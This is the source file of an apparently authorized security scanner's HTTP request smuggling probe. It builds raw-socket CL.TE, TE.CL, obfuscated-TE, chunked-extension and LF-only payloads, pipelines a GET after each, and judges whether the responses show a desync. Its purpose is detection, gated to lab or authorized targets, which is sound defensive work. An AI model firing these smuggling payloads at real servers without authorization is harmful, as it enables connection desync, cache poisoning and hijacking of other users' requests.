// Dark Matter rule-based scanner — HTTP request smuggling probe (raw socket).
//
// Needs node:net — fetch normalizes Content-Length/Transfer-Encoding, so
// the ambiguity must be crafted byte-exact.
//
// What it does (conservative, two checks):
//   1. AMBIGUITY: send a POST carrying BOTH Content-Length and
//      Transfer-Encoding: chunked with conflicting lengths. A server that
//      answers 200/301/404 normally (instead of 400) accepts the
//      ambiguity — the prerequisite for CL.TE / TE.CL desync.
//   2. DESYNC: pipeline a second GET right after the ambiguous body. If the
//      server treats leftover bytes as a new request, the GET's response
//      arrives malformed/extra — proving the desync.
//
// Oracle: the ambiguous request must behave DIFFERENTLY from the clean
// baseline in a smuggling-indicative way (extra response, 400 on the
// pipelined GET, or a timeout where the baseline was instant).
// Anything less → no finding. This probe would rather miss than cry wolf.
//
// class 'request_smuggling' → default protocol → signalCorrelated=true.
// Severity: high on proven desync, medium on accepted ambiguity alone.
//
// SAFETY: lab/authorized targets only (the whole scan is authorized-only);
// tiny bodies, no cache poisoning, connection closed after each attempt.
//
// TE.CL / TE.TE / CHUNKED-EXT / LF-ONLY (14 Nov 2026, rows #352–#354):
// the same raw-socket oracle, appended AFTER the CL.TE leg — the new
// legs run only when CL.TE stayed quiet (its early returns below are
// untouched) and only on lab targets (allowWrite + lab host, the same
// gate as file-upload; the plan call passes both through). Each leg
// fires a high finding ONLY on a proven desync judged by the shared
// assessSmugglingDesync oracle (a 400 on the pipelined GET, a
// response-count divergence, or a timeout where the baseline was
// instant); a correct 400 rejection of the ambiguous request is
// quiet. One finding per leg — the first proven attempt wins. The
// legs are lab-gated because they send deliberately malformed framing
// (obfuscated headers, LF-only endings); the CL.TE leg stays ungated
// exactly as before. Sibling probes: CL.CL (smugglingClCl.js, #503),
// 0.CL/CL.0 (smugglingZeroCl.js, #504), H2 tunnelling
// (smugglingH2Tunnel.js, #505).
import net from 'node:net';
import { isLabTargetHost } from '../../labCreds.js';
import { assessSmugglingDesync, responseStatuses } from './smugglingClCl.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function targetParts(url) {
  const u = new URL(url);
  return {
    host: u.hostname,
    port: u.port ? Number(u.port) : u.protocol === 'https:' ? 443 : 80,
    tls: u.protocol === 'https:',
    path: u.pathname + u.search || '/',
  };
}

// HTTPS via raw socket needs TLS — out of scope for v1; http only.
function rawExchange(host, port, payload, timeoutMs = 12000) {
  return new Promise((resolve) => {
    const sock = net.createConnection({ host, port });
    const timer = setTimeout(() => {
      sock.destroy();
      resolve({ data: '', timedOut: true });
    }, timeoutMs);
    let data = '';
    sock.on('connect', () => sock.write(payload));
    sock.on('data', (chunk) => {
      data += chunk.toString('latin1');
    });
    sock.on('close', () => {
      clearTimeout(timer);
      resolve({ data, timedOut: false });
    });
    sock.on('error', () => {
      clearTimeout(timer);
      resolve({ data, timedOut: false, error: true });
    });
    // Half-close: give the server a beat to answer, then end our side.
    setTimeout(() => {
      try {
        sock.end();
      } catch {
        // ignore
      }
    }, Math.min(timeoutMs - 1000, 8000));
  });
}

function countResponses(data) {
  // Pipelined responses arrive back-to-back ('okHTTP/1.1 ...') — no line
  // start to anchor on. Count status lines anywhere; bodies don't carry
  // 'HTTP/x.y NNN' tokens.
  return (data.match(/HTTP\/\d(?:\.\d)? \d{3}/g) || []).length;
}

// ---- new-variant payload builders (rows #352–#354, pure) ------------------

/** TE.CL (#352): same conflicting body as the CL.TE leg, but the
 * Transfer-Encoding header is presented BEFORE Content-Length. Pure. */
export function buildTeClPayload(path, host) {
  const base = `Host: ${host}\r\nUser-Agent: ${UA}\r\nConnection: keep-alive\r\n`;
  return (
    `POST ${path} HTTP/1.1\r\n${base}Transfer-Encoding: chunked\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0\r\n\r\nX` +
    `GET ${path} HTTP/1.1\r\n${base}\r\n`
  );
}

/**
 * TE.TE obfuscated-TE (#353): the same conflicting body, but the
 * Transfer-Encoding header is spelled so that only a lenient parser
 * recognises it as chunked. `spelling` is one of 'xchunked'
 * (Transfer-Encoding: xchunked), 'space-colon' (a space before the
 * colon), 'duplicate' (chunked then identity — the two headers
 * disagree), 'vertical-tab' (a VT byte where the space should be).
 * Pure.
 */
export function buildObfuscatedTePayload(path, host, spelling) {
  const base = `Host: ${host}\r\nUser-Agent: ${UA}\r\nConnection: keep-alive\r\n`;
  const te =
    spelling === 'xchunked'
      ? 'Transfer-Encoding: xchunked'
      : spelling === 'space-colon'
        ? 'Transfer-Encoding : chunked'
        : spelling === 'duplicate'
          ? 'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity'
          : spelling === 'vertical-tab'
            ? 'Transfer-Encoding:\x0bchunked'
            : 'Transfer-Encoding: chunked';
  return (
    `POST ${path} HTTP/1.1\r\n${base}Content-Length: 6\r\n${te}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0\r\n\r\nX` +
    `GET ${path} HTTP/1.1\r\n${base}\r\n`
  );
}

/**
 * Chunked extension (#354): the terminal 0-chunk carries an extension
 * (`0;ext=x`). A parser that understands extensions ends the body
 * there and the leftover X corrupts the pipelined GET; a parser that
 * falls back to Content-Length reads the whole 12-byte body and the
 * GET is clean. Content-Length is 12 — the exact body length — so a
 * CL-honouring server stays quiet. Pure.
 */
export function buildChunkedExtPayload(path, host) {
  const base = `Host: ${host}\r\nUser-Agent: ${UA}\r\nConnection: keep-alive\r\n`;
  return (
    `POST ${path} HTTP/1.1\r\n${base}Content-Length: 12\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0;ext=x\r\n\r\nX` +
    `GET ${path} HTTP/1.1\r\n${base}\r\n`
  );
}

/**
 * LF-only (#354): the chunked body is terminated with LF-only line
 * endings (`0\n\nX`) instead of CRLF. A parser that accepts LF in
 * chunked framing ends the body at the 0-chunk and the leftover X
 * corrupts the pipelined GET; a parser that falls back to
 * Content-Length reads the whole 4-byte body and the GET is clean.
 * Content-Length is 4 — the exact body length — so a CL-honouring
 * server stays quiet. Pure.
 */
export function buildLfOnlyPayload(path, host) {
  const base = `Host: ${host}\r\nUser-Agent: ${UA}\r\nConnection: keep-alive\r\n`;
  return (
    `POST ${path} HTTP/1.1\r\n${base}Content-Length: 4\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0\n\nX` +
    `GET ${path} HTTP/1.1\r\n${base}\r\n`
  );
}

// The three new legs (rows #352–#354). Each leg is a set of attempts
// sharing one finding id: the first attempt that proves a desync wins
// the leg. `label` is what lands in the finding evidence.
const TE_VARIANT_LEGS = [
  {
    leg: 'te-cl',
    id: 'request-smuggling-te-cl-desync',
    title: 'HTTP request smuggling (TE.CL desync proven)',
    attempts: [
      {
        name: 'te-cl',
        label: 'Transfer-Encoding before Content-Length',
        build: buildTeClPayload,
      },
    ],
  },
  {
    leg: 'te-te',
    id: 'request-smuggling-te-te-desync',
    title: 'HTTP request smuggling (TE.TE obfuscated-TE desync proven)',
    attempts: [
      {
        name: 'te-te-xchunked',
        label: 'obfuscated spelling: xchunked',
        build: (p, h) => buildObfuscatedTePayload(p, h, 'xchunked'),
      },
      {
        name: 'te-te-space-colon',
        label: 'obfuscated spelling: space-before-colon',
        build: (p, h) => buildObfuscatedTePayload(p, h, 'space-colon'),
      },
      {
        name: 'te-te-duplicate',
        label: 'obfuscated spelling: duplicate Transfer-Encoding headers',
        build: (p, h) => buildObfuscatedTePayload(p, h, 'duplicate'),
      },
      {
        name: 'te-te-vertical-tab',
        label: 'obfuscated spelling: vertical-tab',
        build: (p, h) => buildObfuscatedTePayload(p, h, 'vertical-tab'),
      },
    ],
  },
  {
    leg: 'chunked-ext',
    id: 'request-smuggling-chunked-ext-desync',
    title: 'HTTP request smuggling (chunked-extension desync proven)',
    attempts: [
      {
        name: 'chunked-ext',
        label: 'chunked extension on the terminal 0-chunk (0;ext=x)',
        build: buildChunkedExtPayload,
      },
    ],
  },
  {
    leg: 'lf-only',
    id: 'request-smuggling-lf-only-desync',
    title: 'HTTP request smuggling (LF-only desync proven)',
    attempts: [
      {
        name: 'lf-only',
        label: 'LF-only line endings in the chunked body',
        build: buildLfOnlyPayload,
      },
    ],
  },
];

export async function probeRequestSmuggling(url, opts = {}) {
  const findings = [];
  const diag = opts && typeof opts.diagnostics === 'object' && opts.diagnostics ? opts.diagnostics : null;
  const setDiag = (k, v) => {
    if (diag) diag[k] = v;
  };
  const { host, port, tls, path } = targetParts(url);
  if (tls) return findings; // v1: plain http only (documented limit)
  const base = `Host: ${host}\r\nUser-Agent: ${UA}\r\nConnection: keep-alive\r\n`;

  // Baseline: clean POST, then pipelined GET — expect exactly 2 responses.
  const cleanBody = 'a=1';
  const baselinePayload =
    `POST ${path} HTTP/1.1\r\n${base}Content-Length: ${cleanBody.length}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n${cleanBody}` +
    `GET ${path} HTTP/1.1\r\n${base}\r\n`;
  let baseline;
  try {
    baseline = await rawExchange(host, port, baselinePayload, opts.timeoutMs);
  } catch {
    return findings;
  }
  if (baseline.error || baseline.timedOut) return findings;
  const baselineResponses = countResponses(baseline.data);
  if (baselineResponses < 2) return findings; // server won't pipeline — oracle unusable

  // Ambiguous: CL says 6, chunked says 0-length. Then pipelined GET.
  // If the backend honors CL and the frontend TE (or vice versa), the
  // leftover bytes corrupt the next request on the connection.
  const ambiguousPayload =
    `POST ${path} HTTP/1.1\r\n${base}Content-Length: 6\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0\r\n\r\nX` +
    `GET ${path} HTTP/1.1\r\n${base}\r\n`;
  let amb;
  try {
    amb = await rawExchange(host, port, ambiguousPayload, opts.timeoutMs);
  } catch {
    return findings;
  }
  if (amb.error) return findings;
  const ambResponses = countResponses(amb.data);
  const ambHas400 = /HTTP\/\d(?:\.\d)? 400/.test(amb.data);

  // Proven desync, judged by the shared oracle (smugglingClCl.js):
  // the probe's response-status sequence must differ from the
  // baseline's — a 400 on the pipelined GET, a missing/extra response,
  // or a timeout where the baseline was instant. A 400 on the FIRST
  // response is correct rejection of the ambiguity, not a desync
  // (the old inline check flagged any 400 anywhere — a latent FP
  // against the verified #351 semantics: batch-6 "a 400 on the
  // pipelined GET" — and scanner.test.js's well-behaved-server test).
  const baselineSecondOk = countResponses(baseline.data) >= 2;
  const judged = assessSmugglingDesync({ baseline, probe: amb });
  if (judged.verdict === 'confirmed') {
    findings.push({
      class: 'request_smuggling',
      id: 'request-smuggling-desync',
      title: 'HTTP request smuggling (CL.TE desync proven)',
      severity: 'high',
      url,
      evidence: {
        request: 'POST with conflicting Content-Length: 6 + Transfer-Encoding: chunked, pipelined GET',
        response: `baseline: ${baselineResponses} clean responses; ambiguous: ${ambResponses} responses${ambHas400 ? ' incl. 400' : ''} — leftover bytes desynced the connection`,
        impact_demo: 'attacker bytes processed as a new request — cache poisoning / credential hijack primitive',
        signalCorrelated: true,
      },
    });
    return findings;
  }
  // New-variant legs (rows #352–#354), LAB-GATED: deliberately
  // malformed framing (obfuscated headers, LF-only endings) is sent
  // only when the scan explicitly allows writes on a lab target
  // (allowWrite + lab host — the same gate file-upload gets; the plan
  // call passes both through). The CL.TE leg above stays ungated
  // exactly as before. One finding per leg — the first proven attempt
  // wins, and a proven desync supersedes the ambiguity note below.
  const labGated = opts.allowWrite !== true || !isLabTargetHost(url, opts.labTargets);
  if (labGated) {
    setDiag('skipped', 'lab-gated: TE variants need allowWrite + a lab target host');
  } else {
    for (const leg of TE_VARIANT_LEGS) {
      for (const attempt of leg.attempts) {
        const payload = attempt.build(path, host);
        let probe;
        try {
          probe = await rawExchange(host, port, payload, opts.timeoutMs);
        } catch {
          continue;
        }
        const variantJudged = assessSmugglingDesync({ baseline, probe });
        setDiag(`variant:${attempt.name}`, variantJudged.verdict);
        if (variantJudged.verdict !== 'confirmed') continue;
        findings.push({
          class: 'request_smuggling',
          id: leg.id,
          title: leg.title,
          severity: 'high',
          url,
          evidence: {
            request: `POST with ${attempt.label}, pipelined GET`,
            response: `baseline: ${baselineResponses} clean responses (${responseStatuses(baseline.data).join(',')}); probe (${attempt.name} — ${attempt.label}): ${countResponses(probe.data)} responses (${responseStatuses(probe.data).join(',')}) — ${variantJudged.reason}`,
            impact_demo: 'attacker bytes processed as a new request — cache poisoning / credential hijack primitive',
            signalCorrelated: true,
          },
        });
        return findings;
      }
    }
  }
  // Accepted ambiguity without proven desync: still a real finding, medium.
  if (!ambHas400 && ambResponses >= 1 && baselineSecondOk) {
    // Only flag if the server clearly accepted BOTH length headers
    // (no 400/501 rejection of the ambiguous request itself).
    const firstAmb = (amb.data.match(/HTTP\/\d(?:\.\d)? \d{3}/) || [''])[0];
    if (/ [23]\d\d/.test(firstAmb)) {
      findings.push({
        class: 'request_smuggling',
        id: 'request-smuggling-ambiguity',
        title: 'HTTP request smuggling prerequisite: conflicting length headers accepted',
        severity: 'medium',
        url,
        evidence: {
          request: 'POST with conflicting Content-Length + Transfer-Encoding: chunked',
          response: `server answered ${firstAmb.trim()} instead of rejecting the ambiguity with 400`,
          impact_demo: 'front/back length disagreement is the precondition for CL.TE / TE.CL desync — verify with a desync proof',
          signalCorrelated: true,
        },
      });
    }
  }
  return findings;
}
